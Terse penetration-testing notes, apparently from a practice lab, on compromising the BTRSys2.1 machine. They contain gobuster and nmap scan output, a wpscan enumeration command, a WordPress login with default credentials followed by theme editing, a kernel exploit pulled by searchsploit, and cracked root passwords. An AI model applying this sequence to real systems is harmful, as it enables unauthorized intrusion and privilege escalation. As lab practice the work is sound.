----------------------------------------------------
# Author -> Shubham Rannpise
----------------------------------------------------
# BTRSys2.1
# 23/2/2023

----------------------------------------------------
# gobuster
----------------------------------------------------
/upload               (Status: 301) [Size: 317] [--> http://192.168.112.50/upload/]
/wordpress            (Status: 301) [Size: 320] [--> http://192.168.112.50/wordpress/]
/javascript           (Status: 301) [Size: 321] [--> http://192.168.112.50/javascript/]
/INSTALL              (Status: 200) [Size: 1241]
/LICENSE              (Status: 200) [Size: 1672]

----------------------------------------------------
# nmap result
----------------------------------------------------
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.1 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))


robots.txt


wpscan -u http://192.168.112.50/wordpress/ --enumerate at --enumerate ap --enumerate u

login wp 
admin:admin
edit theme

----------------------------------------------------
# priv esc
----------------------------------------------------
uname -a
Linux ubuntu 4.4.0-62-generic #83-Ubuntu SMP Wed Jan 18 14:10:15 UTC 2017 x86_64 x86_64 x86_64 GNU/Linux
 searchsploit -m 41458.c
got root


root:roottoor

cat wp-config
explore mysql
crach hash
su rooo
roottoor
